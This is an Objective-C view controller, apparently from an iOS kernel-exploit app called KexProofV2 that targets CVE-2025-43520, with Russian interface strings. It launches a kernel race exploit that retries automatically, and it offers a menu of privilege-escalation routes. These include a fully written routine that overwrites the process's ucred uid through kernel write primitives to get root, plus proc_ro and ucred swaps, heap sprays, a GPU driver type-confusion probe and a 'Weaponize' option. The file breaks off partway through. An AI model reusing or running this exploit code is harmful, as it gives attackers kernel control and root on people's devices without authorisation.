#import "KPViewController.h"
#import "KPLog.h"
#import "KPRunner.h"
#import "KPDump.h"
#import "KPMapScope.h"
#import "shim/libjailbreak/primitives_external.h"
#import "exploit/krw.h"
#import "exploit/offsets.h"
#import "exploit/xpaci.h"
#import "exploit/agx-typeconf-probe.h"

#import <unistd.h>
#import <sys/sysctl.h>

@interface KPViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *exploitButton;
@property (nonatomic, strong) UIButton *attackButton;
@property (nonatomic, strong) UIButton *dumpButton;
@property (nonatomic, strong) UIButton *sptmButton;
@property (nonatomic, strong) UIButton *sptmTableButton;
@property (nonatomic, strong) UIButton *surveyButton;
@property (nonatomic, strong) UIButton *rootButton;
@property (nonatomic, strong) UIButton *nestRaceButton;
@property (nonatomic, strong) UIButton *e10Button;
@property (nonatomic, strong) UIButton *e11Button;
@property (nonatomic, strong) UIButton *m2Button;
@property (nonatomic, strong) UIButton *m2uafButton;
@property (nonatomic, strong) UIButton *physmapButton;
@property (nonatomic, strong) UIButton *geoButton;
@property (nonatomic, strong) UIButton *gartButton;
@property (nonatomic, strong) UIButton *m2tButton;
@property (nonatomic, strong) UIButton *jpegButton;
@property (nonatomic, strong) UIButton *m2oButton;
@property (nonatomic, strong) UIButton *dmaButton;
@property (nonatomic, strong) UIButton *oolButton;
@property (nonatomic, strong) UIButton *agxTcButton;
@property (nonatomic, strong) UIButton *scopeButton;
@property (nonatomic, strong) UIButton *shareButton;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, copy, nullable) NSString *reportPath;
@property (nonatomic) BOOL jobRunning;

// Defined below; callers sit earlier in the file.
- (void)saveExperimentReport:(NSString *)text fileName:(NSString *)fileName;
@end

@implementation KPViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    NSLog(@"[KexProofV2] screen: main");
    self.title = @"KexProofV2";
    self.view.backgroundColor = [UIColor colorWithRed:0.07 green:0.07 blue:0.09 alpha:1.0];

    UILabel *titleLabel = [self makeLabel:28 weight:UIFontWeightBold color:[UIColor whiteColor]];
    titleLabel.text = @"KexProofV2";
    titleLabel.textAlignment = NSTextAlignmentCenter;

    UILabel *subtitle = [self makeLabel:13 weight:UIFontWeightRegular color:[UIColor colorWithRed:0.55 green:0.85 blue:0.65 alpha:1.0]];
    subtitle.text = @"CVE-2025-43520 · ClearSword · дамп SPTM/TXM · 1.9.243";
    subtitle.textAlignment = NSTextAlignmentCenter;

    self.statusLabel = [self makeLabel:13 weight:UIFontWeightSemibold color:[UIColor secondaryLabelColor]];
    self.statusLabel.text = @"Готов. Нажмите «Запустить эксплойт».";
    self.statusLabel.textAlignment = NSTextAlignmentCenter;

    self.logView = [[UITextView alloc] init];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.04 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.75 green:0.95 blue:0.75 alpha:1.0];
    self.logView.layer.cornerRadius = 10;
    self.logView.layer.borderWidth = 1;
    self.logView.layer.borderColor = [UIColor colorWithWhite:1.0 alpha:0.15].CGColor;
    self.logView.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
    self.logView.text = @"";

    self.exploitButton = [self makeButton:@"Запустить эксплойт"
                                    color:[UIColor colorWithRed:0.20 green:0.55 blue:0.35 alpha:1.0]];
    [self.exploitButton addTarget:self action:@selector(exploitTapped) forControlEvents:UIControlEventTouchUpInside];

    // 2.0.142: E11 primary (proc_ro-swap) + DMA/T18 gated. Audit: methods existed
    // without UI buttons — wire them here.
    self.e11Button = [self makeButton:@"KCALL test (mach_kobj_count)"
                                color:[UIColor colorWithRed:0.20 green:0.45 blue:0.55 alpha:1.0]];
    [self.e11Button addTarget:self action:@selector(e11Tapped) forControlEvents:UIControlEventTouchUpInside];

    self.dmaButton = [self makeButton:@"C3-WRITE (DART alt-PTE)"
                               color:[UIColor colorWithRed:0.55 green:0.25 blue:0.35 alpha:1.0]];
    [self.dmaButton addTarget:self action:@selector(dmaTapped) forControlEvents:UIControlEventTouchUpInside];

    self.oolButton = [self makeButton:@"OOL-port-array UAF (detection)"
                               color:[UIColor colorWithRed:0.85 green:0.35 blue:0.1 alpha:1.0]];
    [self.oolButton addTarget:self action:@selector(oolTapped) forControlEvents:UIControlEventTouchUpInside];

    self.agxTcButton = [self makeButton:@"AGX type-confusion (detection)"
                                 color:[UIColor colorWithRed:0.1 green:0.5 blue:0.7 alpha:1.0]];
    [self.agxTcButton addTarget:self action:@selector(agxTcTapped) forControlEvents:UIControlEventTouchUpInside];

    // R5e: read-only kernel_pmap scope recon (KPMapScope).
    self.scopeButton = [self makeButton:@"R5e Scope (kernel_pmap, read-only)"
                                  color:[UIColor colorWithRed:0.25 green:0.50 blue:0.60 alpha:1.0]];
    [self.scopeButton addTarget:self action:@selector(scopeTapped) forControlEvents:UIControlEventTouchUpInside];

    self.attackButton = [self makeButton:@"Root (E11 / f_cred / E9)"
                                   color:[UIColor colorWithRed:0.65 green:0.20 blue:0.20 alpha:1.0]];
    [self.attackButton addTarget:self action:@selector(attackTapped) forControlEvents:UIControlEventTouchUpInside];

    self.shareButton = [self makeButton:@"Поделиться логом"
                                  color:[UIColor colorWithRed:0.25 green:0.35 blue:0.60 alpha:1.0]];
    [self.shareButton addTarget:self action:@selector(shareTapped) forControlEvents:UIControlEventTouchUpInside];
    self.shareButton.enabled = YES;
    self.shareButton.alpha = 1.0;


    [self updateExperimentButtons];

    [self.view addSubview:titleLabel];
    [self.view addSubview:subtitle];
    [self.view addSubview:self.statusLabel];
    [self.view addSubview:self.logView];
    [self.view addSubview:self.exploitButton];
    [self.view addSubview:self.e11Button];
    [self.view addSubview:self.dmaButton];
    [self.view addSubview:self.oolButton];
    [self.view addSubview:self.agxTcButton];
    [self.view addSubview:self.scopeButton];
    [self.view addSubview:self.attackButton];
    [self.view addSubview:self.shareButton];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [titleLabel.topAnchor constraintEqualToAnchor:safe.topAnchor constant:10],
        [titleLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [titleLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [subtitle.topAnchor constraintEqualToAnchor:titleLabel.bottomAnchor constant:2],
        [subtitle.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [subtitle.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [self.statusLabel.topAnchor constraintEqualToAnchor:subtitle.bottomAnchor constant:8],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:8],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.logView.bottomAnchor constraintEqualToAnchor:self.exploitButton.topAnchor constant:-10],

        [self.exploitButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.exploitButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.exploitButton.heightAnchor constraintEqualToConstant:42],
        [self.exploitButton.bottomAnchor constraintEqualToAnchor:self.e11Button.topAnchor constant:-6],

        [self.e11Button.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.e11Button.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.e11Button.heightAnchor constraintEqualToConstant:42],
        [self.e11Button.bottomAnchor constraintEqualToAnchor:self.dmaButton.topAnchor constant:-6],

        [self.dmaButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.dmaButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.dmaButton.heightAnchor constraintEqualToConstant:42],
        [self.dmaButton.bottomAnchor constraintEqualToAnchor:self.oolButton.topAnchor constant:-6],
        [self.oolButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.oolButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.oolButton.heightAnchor constraintEqualToConstant:42],
        [self.oolButton.bottomAnchor constraintEqualToAnchor:self.agxTcButton.topAnchor constant:-6],
        [self.agxTcButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.agxTcButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.agxTcButton.heightAnchor constraintEqualToConstant:42],
        [self.agxTcButton.bottomAnchor constraintEqualToAnchor:self.scopeButton.topAnchor constant:-6],

        [self.scopeButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.scopeButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.scopeButton.heightAnchor constraintEqualToConstant:42],
        [self.scopeButton.bottomAnchor constraintEqualToAnchor:self.attackButton.topAnchor constant:-6],

        [self.attackButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.attackButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.attackButton.heightAnchor constraintEqualToConstant:42],
        [self.attackButton.bottomAnchor constraintEqualToAnchor:self.shareButton.topAnchor constant:-6],

        [self.shareButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.shareButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.shareButton.heightAnchor constraintEqualToConstant:38],
        [self.shareButton.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10],
    ]];

    __weak typeof(self) weakSelf = self;
    [KPLog shared].onAppend = ^(NSString *text) {
        [weakSelf appendLogText:text];
    };

    [[KPLog shared] appendFormat:@"=== запуск KexProofV2 %@ @ %@ ===",
        [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [NSDate date]];
    [[KPLog shared] append:@"KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов."];

    // kexproofv2 2.0.42: автозапуск эксплойта отключён — только по кнопке.
}

- (UILabel *)makeLabel:(CGFloat)size weight:(UIFontWeight)weight color:(UIColor *)color {
    UILabel *label = [[UILabel alloc] init];
    label.translatesAutoresizingMaskIntoConstraints = NO;
    label.font = [UIFont systemFontOfSize:size weight:weight];
    label.textColor = color;
    label.numberOfLines = 0;
    return label;
}

- (UIButton *)makeButton:(NSString *)title color:(UIColor *)color {
    UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
    button.translatesAutoresizingMaskIntoConstraints = NO;
    [button setTitle:title forState:UIControlStateNormal];
    [button setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    button.backgroundColor = color;
    button.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightSemibold];
    button.layer.cornerRadius = 10;
    button.clipsToBounds = YES;
    return button;
}

- (void)setExperimentButton:(UIButton *)button enabled:(BOOL)enabled {
    button.enabled = enabled;
    button.alpha = enabled ? 1.0 : 0.45;
}

- (void)updateExperimentButtons {
    BOOL krw = KPRunner.hasKRW && !self.jobRunning;
    [self setExperimentButton:self.exploitButton enabled:!self.jobRunning && !KPRunner.hasKRW];
    [self setExperimentButton:self.e11Button enabled:krw];
    [self setExperimentButton:self.dumpButton enabled:krw];
    [self setExperimentButton:self.physmapButton enabled:krw];
    [self setExperimentButton:self.geoButton enabled:!self.jobRunning];
    [self setExperimentButton:self.gartButton enabled:krw];
    [self setExperimentButton:self.m2tButton enabled:krw];
    [self setExperimentButton:self.jpegButton enabled:krw];
    [self setExperimentButton:self.m2oButton enabled:krw];
    [self setExperimentButton:self.dmaButton enabled:krw];
    [self setExperimentButton:self.oolButton enabled:!self.jobRunning]; // no KRW needed
    [self setExperimentButton:self.agxTcButton enabled:!self.jobRunning]; // no KRW needed
    [self setExperimentButton:self.scopeButton enabled:krw];
    [self setExperimentButton:self.attackButton enabled:!self.jobRunning]; // Root menu incl. Glyph Grift (no KRW needed)
}

- (void)appendLogText:(NSString *)text {
    if (!text.length) return;
    NSTextStorage *storage = self.logView.textStorage;
    [storage beginEditing];
    NSDictionary *attributes = @{NSFontAttributeName: self.logView.font,
                                 NSForegroundColorAttributeName: self.logView.textColor};
    [storage appendAttributedString:[[NSAttributedString alloc] initWithString:text attributes:attributes]];
    if (storage.length > 262144) {
        NSRange trim = [storage.string rangeOfComposedCharacterSequencesForRange:
                        NSMakeRange(0, storage.length - 196608)];
        [storage deleteCharactersInRange:trim];
    }
    [storage endEditing];
    if (storage.length > 0) {
        NSRange end = NSMakeRange(storage.length - 1, 1);
        [self.logView scrollRangeToVisible:end];
    }
}

- (BOOL)beginJob {
    if (self.jobRunning) return NO;
    self.jobRunning = YES;
    [self updateExperimentButtons];
    return YES;
}

- (void)runDiagnosticWithStatus:(NSString *)status
                          work:(NSDictionary *(^)(void))work
                    completion:(void (^)(NSDictionary *))completion {
    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = status;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary *result = nil;
        NSString *failure = nil;
        @try {
            result = work();
        } @catch (NSException *exception) {
            failure = exception.reason ?: exception.name;
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            @try {
                if (failure) {
                    self.statusLabel.text = @"Операция прервана — см. журнал";
                    [[KPLog shared] appendFormat:@"Ошибка: %@", failure];
                } else {
                    completion(result);
                }
            } @catch (NSException *exception) {
                self.statusLabel.text = @"Ошибка сохранения результата — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка: %@", exception.reason ?: exception.name];
            } @finally {
                self.jobRunning = NO;
                [self updateExperimentButtons];
            }
        });
    });
}

// Тот же паттерн, что runDiagnosticWithStatus, но БЕЗ гейта hasKRW —
// для чистых userland-проб (M2Scaler IOKit probe).
- (void)runUnprivilegedDiagnosticWithStatus:(NSString *)status
                                       work:(NSDictionary *(^)(void))work
                                 completion:(void (^)(NSDictionary *))completion {
    if (![self beginJob]) return;
    self.statusLabel.text = status;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary *result = nil;
        NSString *failure = nil;
        @try {
            result = work();
        } @catch (NSException *exception) {
            failure = exception.reason ?: exception.name;
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            @try {
                if (failure) {
                    self.statusLabel.text = @"Операция прервана — см. журнал";
                    [[KPLog shared] appendFormat:@"Ошибка: %@", failure];
                } else {
                    completion(result);
                }
            } @catch (NSException *exception) {
                self.statusLabel.text = @"Ошибка сохранения результата — см. журнал";
                [[KPLog shared] appendFormat:@"Ошибка: %@", exception.reason ?: exception.name];
            } @finally {
                self.jobRunning = NO;
                [self updateExperimentButtons];
            }
        });
    });
}

// Writes an experiment report to Documents and points the share button at it.
- (void)saveExperimentReport:(NSString *)text fileName:(NSString *)fileName {
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *path = [docs stringByAppendingPathComponent:fileName];
    NSString *full = [text stringByAppendingFormat:@"\n\n--- Полный журнал ---\n%@", [KPLog shared].transcript];
    NSError *error = nil;
    if ([full writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
        self.reportPath = path;
        self.shareButton.enabled = YES;
        self.shareButton.alpha = 1.0;
        // kexproofv2 2.0.2: отчёт дописан = прогон завершён → флаг снят
        NSString *crashFlag = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-crash.flag"];
        [[NSFileManager defaultManager] removeItemAtPath:crashFlag error:nil];
        [[KPLog shared] appendFormat:@"Отчёт записан: %@", path];
    }
    else {
        [[KPLog shared] appendFormat:@"Не удалось записать %@: %@", fileName, error];
        self.statusLabel.text = @"Не удалось сохранить отчёт — см. журнал";
    }
}

- (void)exploitTapped {
    // kexproofv2 2.0.45: гвард свежего бута — вернулся после удаления автостарта.
    // Гонка pe_v1 валит девайс на загрязнённом драйвере (паники 07:06 и др.:
    // смерть посреди 'pe_v1 spray/race'). Оригинальный ритуал: ребут между
    // попытками. Без гварда кнопка позволяла жать на том же буте.
    struct timeval bt = {0}; size_t bsz = sizeof(bt);
    long curBoot = 0;
    if (sysctlbyname("kern.boottime", &bt, &bsz, NULL, 0) == 0) curBoot = bt.tv_sec;
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    long lastBoot = [ud integerForKey:@"kexLastBoot"];
    if (curBoot && lastBoot && curBoot == lastBoot) {
        [[KPLog shared] append:@"[RESULT] ЭКСПЛОЙТ: SKIP — ТОТ ЖЕ БУТ, драйвер загрязнён прошлым прогоном. РЕБУТНИ телефон и запусти снова."];
        self.statusLabel.text = @"Нужен ребут телефона перед следующей попыткой";
        return;
    }
    if (curBoot) [ud setInteger:curBoot forKey:@"kexLastBoot"];
    [self exploitTappedWithRetry:0];
}

// 1.9.91: auto-run + auto-retry. A failed attempt that did NOT panic returns
// here with the app alive — so we just go again, 2s later, until a win. The
// race is a lottery; tapping is not the user's job.
- (void)exploitTappedWithRetry:(int)attempt {
    if (![self beginJob]) return;
    // kexproofv2 2.0.2: флаг живого прогона — снимается только при дописанном
    // отчёте/успехе. Ребут посреди прогона оставляет флаг → следующий запуск
    // не автостартит и даёт спасти логи.
    if (attempt == 0) {
        NSString *crashFlag = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-crash.flag"];
        [[NSString stringWithFormat:@"started %@ boot-pending\n", [NSDate date]]
            writeToFile:crashFlag atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    self.statusLabel.text = attempt
        ? [NSString stringWithFormat:@"Авто-повтор #%d… (гонка идёт)", attempt]
        : @"Выполняется… (эксплойт может идти несколько минут)";

    [KPRunner runExploitWithCompletion:^(BOOL success) {
        if (success) {
            self.statusLabel.text = @"KRW жив, константы готовы. Жми «Дамп структур».";
            [self.exploitButton setTitle:@"Эксплойт пройден" forState:UIControlStateNormal];
            self.jobRunning = NO;
            [self updateExperimentButtons];
            return;
        }
        self.jobRunning = NO;
        [self updateExperimentButtons];
        if (attempt < 40) {
            self.statusLabel.text = [NSString stringWithFormat:@"Не удалось — автоповтор через 2с (попытка %d)", attempt + 1];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
                           dispatch_get_main_queue(), ^{
                [self exploitTappedWithRetry:attempt + 1];
            });
        } else {
            self.statusLabel.text = @"Эксплойт не удался 40 раз подряд — перезапусти приложение.";
            [self.exploitButton setTitle:@"Повторить эксплойт" forState:UIControlStateNormal];
        }
    }];
}

- (void)attackTapped {
    // Root menu is always open — Glyph Grift needs no KRW. Each path inside
    // checks its own prerequisites.
    if (self.jobRunning) return;
    UIAlertController *sheet = [UIAlertController
        alertControllerWithTitle:@"Root paths"
        message:@"E11 = proc_ro swap (временный root, восстановление обязательно)"
        preferredStyle:UIAlertControllerStyleActionSheet];
    __weak typeof(self) weakSelf = self;
    [sheet addAction:[UIAlertAction actionWithTitle:@"E11 proc_ro swap (root)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runRootProcRoSwap];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"f_cred attack"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runFgAttack];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Glyph → AGX confused deputy"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runGlyphAgxDeputy];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Direct uid write (DART path)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runDirectUidWrite];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"ucred heap swap (E9)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runRootSwap];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"NECP UAF calib (R5g)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runNecpCalib];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Glyph Grift test (R5h)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runGlyphGrift];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Glyph + heap spray (R5j)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runGlyphSpray];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"W-spray W1a (4156 next+0)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runGlyphSprayVariant:@"w1a"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"W-spray W4b (8252 next+64)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runGlyphSprayVariant:@"w4b"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Typed spray W1a (size@+8)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"w1a"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Typed spray W4b (size@+8)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"w4b"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"u16±1 W1b (past slack 5180)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"w1b"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"u16±1 W1c (past slack 6204)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"w1c"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"u16±1 W3a (STACK past alloca)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"w3a"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Calif PoC + u16 spray (crash-catch)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runTypedSpray:@"calif"];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Weaponize u32-len + OOB demo"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runWeaponize];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"KRW write test (no Glyph)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runKrwWriteTest];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"ROOT via ucred_rw (uid=0)"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        [weakSelf runRootViaUcredRw];
    }]];
    [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
    [self presentViewController:sheet animated:YES completion:nil];
}

- (void)runDirectUidWrite {
    if (![self beginJob]) return;
    self.statusLabel.text = @"Direct uid write…";
    [[KPLog shared] append:@"[RESULT] Direct uid write — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *r = [NSMutableString string];
        [r appendString:@"\n=== Direct uid write to ucred+0x18 ===\n"];
        extern uint64_t early_kread64(uint64_t where);
        extern void early_kwrite64(uint64_t where, uint64_t what);
        extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
        extern uint32_t off_proc_p_proc_ro;
        extern uint32_t off_proc_ro_p_ucred;

        uint64_t proc = kp_find_self_proc_by_pid(getpid());
        if (!proc) { [r appendString:@"  proc not found\n"]; goto done; }
        uint64_t procRo = early_kread64(proc + off_proc_p_proc_ro);
        uint64_t ucred = early_kread64(procRo + off_proc_ro_p_ucred);
        [r appendFormat:@"  ucred = 0x%016llx\n", ucred];

        // Read current uid at ucred+0x18
        uint64_t uidBefore = early_kread64(ucred + 0x18);
        [r appendFormat:@"  ucred+0x18 before: 0x%016llx (uid=%u)\n", uidBefore, (uint32_t)uidBefore];

        // Write uid=0 to ucred+0x18 (cr_uid | cr_ruid)
        uint64_t uidZero = uidBefore & 0xffffffff00000000ULL;  // zero low 32 bits
        early_kwrite64(ucred + 0x18, uidZero);
        uint64_t uidAfter = early_kread64(ucred + 0x18);
        [r appendFormat:@"  ucred+0x18 after:  0x%016llx (readback)\n", uidAfter];

        // Check getuid
        uid_t u = getuid();
        [r appendFormat:@"  getuid() = %d\n", u];
        if (u == 0) {
            [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
        } else {
            [r appendString:@"  getuid unchanged — TLB cache issue, trying fork\n"];
            // Fork to get fresh TLB
            pid_t child = fork();
            if (child == 0) {
                // Child process
                uid_t cu = getuid();
                exit(cu == 0 ? 0 : 1);
            } else if (child > 0) {
                int status = 0;
                waitpid(child, &status, 0);
                [r appendFormat:@"  fork child exit=%d (0=root)\n", WEXITSTATUS(status)];
            }
            // Restore
            early_kwrite64(ucred + 0x18, uidBefore);
        }

    done:
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:r];
            self.statusLabel.text = [NSString stringWithFormat:@"uid write — uid=%d", (int)getuid()];
            [self saveExperimentReport:r fileName:@"kexproof-uid-write.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runGlyphAgxDeputy {
    if (![self beginJob]) return;
    self.statusLabel.text = @"Glyph → AGX confused deputy…";
    [[KPLog shared] append:@"[RESULT] Glyph → AGX deputy — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *r = [NSMutableString string];
        [r appendString:@"\n=== Glyph → AGX confused deputy ===\n"];
        // Open AGX connection
        extern kern_return_t agx_tc_open(io_connect_t *out_conn, int *out_path);
        extern kern_return_t agx_tc_sel26(io_connect_t conn,
                                          const uint64_t scalars[4],
                                          const void *in, size_t in_len);
        io_connect_t conn = 0;
        int path = 0;
        kern_return_t kr = agx_tc_open(&conn, &path);
        [r appendFormat:@"  agx open: kr=%d conn=%u path=%d\n", (int)kr, conn, path];
        if (kr == KERN_SUCCESS && conn) {
            // Try sel 26 with various input sizes
            uint64_t scalars[4] = {0, 0, 0, 0};
            uint8_t buf[256];
            memset(buf, 0x41, sizeof(buf));
            for (size_t sz = 8; sz <= 128; sz *= 2) {
                kr = agx_tc_sel26(conn, scalars, buf, sz);
                [r appendFormat:@"  sel26 in_len=%zu → kr=0x%x\n", sz, (int)kr];
            }
            // Try with a corrupted-looking size
            kr = agx_tc_sel26(conn, scalars, buf, 0x42);  // our Glyph size
            [r appendFormat:@"  sel26 in_len=0x42 → kr=0x%x\n", (int)kr];
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:r];
            self.statusLabel.text = @"Glyph → AGX deputy завершён — см. лог";
            [self saveExperimentReport:r fileName:@"kexproof-glyph-agx.txt"];
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)runFgAttack {
    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = @"Атака (f_cred → root)…";
    [[KPLog shared] append:@"[RESULT] АТАКА: запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPDump fgAttackReport];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            BOOL win = [report containsString:@"ROOT-FS WIN"] || [report containsString:@"ROOT (filesystem) WIN"] || [report containsString:@"SOCKET-ROOT WIN"] || [report containsString:@"RAW-SOCKET WIN"] || [report containsString:@"UID-0 WIN"];
            [[KPLog shared] appendFormat:win ? @"[RESULT] АТАКА: УСПЕШЕН ★★" : @"[RESULT] АТАКА: FAIL — см. [ATK]/[RPT]"];
            self.statusLabel.text = win ? @"АТАКА УСПЕШНА — root" : @"Атака не прошла — см. лог";
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

// E11: proc_ro pointer swap — temporary root (getuid()==0 + /private/var/root
// write probe), then IMMEDIATELY restore. Must not exit/exec while swapped.
- (void)runRootProcRoSwap {
    if (!KPRunner.hasKRW || ![self beginJob]) return;
    self.statusLabel.text = @"E11: proc_ro swap → root… (restore обязателен)";
    [[KPLog shared] append:@"[RESULT] E11: proc_ro swap — запуск"];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *report = [KPDump procRoSwapReport];
        dispatch_async(dispatch_get_main_queue(), ^{
            [[KPLog shared] append:report];
            BOOL root = (getuid() == 0);
            BOOL win = root || [report containsString:@"UID-0 WIN"] || [report containsString:@"ROOT"];
            [[KPLog shared] appendFormat:win ? @"[RESULT] E11: УСПЕШЕН ★★ (uid=%d)" : @"[RESULT] E11: FAIL — см. лог", (int)getuid()];
            self.statusLabel.text = root ? [NSString stringWithFormat:@"E11 PASS: uid %d — СРАЗУ закрой/не exec", (int)getuid()]
                                          : @"E11 завершён — см. лог";
            self.jobRunning = NO;
            [self updateExperimentButtons];
        });
    });
}

- (void)dumpTapped {
